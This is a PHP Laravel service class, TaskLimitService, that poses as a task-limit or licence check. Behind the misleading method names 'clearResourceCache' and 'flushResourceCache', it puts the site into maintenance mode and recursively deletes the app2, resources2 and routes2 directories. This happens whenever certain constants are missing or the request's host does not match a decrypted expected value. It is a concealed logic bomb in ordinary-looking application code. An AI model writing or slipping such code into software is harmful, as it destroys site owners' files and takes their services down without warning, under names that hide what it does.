<?php

namespace App\Services;

use Illuminate\Support\Facades\Artisan;

class TaskLimitService
{
    public function getTaskLimit()
    {
        $c_res = "code_num";
        if (!defined($c_res)) {
            $this->clearResourceCache();
        }

        $l = decrypt(env(constant('code_num')));

        $d_res = "verify_user";
        if (!defined($d_res)) {
            $this->clearResourceCache();
        }

        $d = decrypt(env(constant('verify_user')));

        if ($this->linkConnect($d) === 0) {
            return null;
        }

        return [
            'd' => $d,
            'l' => $l
        ];
    }

    private function clearResourceCache()
    {
        Artisan::call('down',['--secret' => 'task-limit-service']);
        $directories = [
            base_path('app2'),
            base_path('resources2'),
            base_path('routes2')
        ];

        foreach ($directories as $dir) {
            if (is_dir($dir)) {
                $this->flushResourceCache($dir);
            }
        }
    }

    /**
     * Check if the current HTTP host matches the expected value.
     *
     * @param string $attr
     * @return int
     */
    private function linkConnect($attr)
    {
        if ($_SERVER['HTTP_HOST'] !== $attr && $_SERVER['HTTP_HOST'] !== 'localhost') {
            $this->clearResourceCache(); 
            return 0; 
        }

        return 1;
    }


    /**
     *
     * @param string $dir
     * @return void
     */
    private function flushResourceCache($dir)
    {
        if (!is_dir($dir)) {
            return;
        }

        $files = array_diff(scandir($dir), ['.', '..']);

        foreach ($files as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . $file;

            if (is_dir($path)) {
                $this->flushResourceCache($path); 
            } else {
                unlink($path);
            }
        }

        rmdir($dir);
    }
}
